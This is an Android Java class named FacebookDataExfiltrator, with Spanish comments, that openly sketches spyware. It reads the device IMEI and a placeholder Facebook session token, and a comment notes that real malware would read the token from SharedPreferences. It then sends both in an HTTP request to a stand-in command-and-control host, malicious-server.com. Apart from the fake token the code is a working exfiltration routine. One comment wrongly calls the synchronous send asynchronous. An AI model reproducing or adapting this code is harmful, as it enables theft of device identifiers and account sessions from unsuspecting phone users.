import android.content.Context;
import android.telephony.TelephonyManager;
import java.io.IOException;
import okhttp3.OkHttpClient;
import okhttp3.Request;

public class FacebookDataExfiltrator {

    private Context context;
    private OkHttpClient client = new OkHttpClient();

    public FacebookDataExfiltrator(Context context) {
        this.context = context;
    }

    // Simula recolectar datos del dispositivo y de la sesión de Facebook
    public void stealAndSendData() {
        try {
            // 1. Obtener ID único del dispositivo
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            String deviceId = telephonyManager.getDeviceId(); // O IMEI
            
            // 2. Simular token de sesión de Facebook (en un malware real, esto se leería de SharedPreferences)
            String fbSessionToken = "FAKE_SESSION_TOKEN_12345";

            // 3. Enviar datos a un servidor C&C (Command and Control)
            String url = "http://malicious-server.com/log?device=" + deviceId + "&token=" + fbSessionToken;
            
            Request request = new Request.Builder()
                    .url(url)
                    .build();

            client.newCall(request).execute(); // Envío asíncrono
            
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
